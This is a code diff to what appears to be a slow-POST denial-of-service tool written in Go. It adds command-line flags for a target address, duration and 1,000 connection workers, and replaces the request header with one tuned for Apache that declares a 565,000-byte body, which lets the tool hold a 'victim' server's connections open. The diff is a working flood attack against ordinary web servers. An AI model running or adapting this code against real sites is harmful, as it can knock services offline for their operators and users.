@@ -41,15 +41,21 @@ var (
 
 func init() {
 	flag.StringVar(&pathConfig, "c", "conf.yml", "Configuration file for proxy-auth module")
+	flag.StringVar(&Config.URL, "a", "", "Address")
+	flag.StringVar(&Config.TestDuration, "d", "15m", "How long testing")
+	flag.IntVar(&Config.DialWorkersCount, "t", 1000, "How start threads")
+	flag.StringVar(&Config.SleepInterval, "s", "1s", "Sleep interval")
 	flag.Parse()
 }
 
 func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 	var err error
-	if err = LoadConfig(); err != nil {
-		fmt.Printf("Error loading configuration file:", err.Error())
-		os.Exit(1)
+	if Config.URL == "" {
+		if err = LoadConfig(); err != nil {
+			fmt.Printf("Error loading configuration file:", err.Error())
+			os.Exit(1)
+		}
 	}
 	if SleepInterval, err = time.ParseDuration(Config.SleepInterval); err != nil {
 		fmt.Printf("Cannot parse sleep_interval=[%s]: [%s]\n", Config.SleepInterval, err)
@@ -79,8 +85,20 @@ func main() {
 	}
 	hostname = victimUri.Host
 	host := victimUri.Host
-	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nContent-Length: 5000\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\n\n",
-		victimUri.RequestURI(), host))
+
+	//Apache
+	headers := fmt.Sprintf(`POST %v HTTP/1.1
+Host: %v
+Connection: close
+Cache-Control: no-cache
+User-Agent: curl/7.29.0
+Content-Length: 565000
+
+`,
+		victimUri.RequestURI(), host)
+	headers = strings.Replace(headers, "\n", "\r\n", -1)
+	fmt.Println(headers)
+	requestHeader := []byte(headers)
 
 	activeConnectionsCh := make(chan int, Config.DialWorkersCount)
 	go activeConnectionsCounter(activeConnectionsCh)
